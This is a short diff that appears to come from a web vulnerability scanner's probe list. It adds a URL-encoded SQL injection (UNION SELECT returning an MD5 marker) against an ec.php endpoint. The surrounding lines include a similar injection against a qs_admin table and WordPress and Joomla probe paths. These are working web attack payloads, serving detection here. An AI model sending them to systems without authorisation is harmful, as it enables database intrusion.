@@ -91,3 +91,4 @@
 /index.php?rest_route=/wp/v2/pages&per_page=100
 /plus/ajax_street.php?act=alphabet&x=11�%27%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5({{num}}),9%20from%20qs_admin%23
 /index.php?option=com_simplemembership&task=checkLoginPass&format=raw&login=
+/ec.php?Checkin=2020-01-01&Checkout=2020-12-31&Ext=101-%25%27%20AND%201%3D0%20UNION%20SELECT%20MD5%28%27{{marker}}%27%29%2C%279123456%27%2C60%20--%20
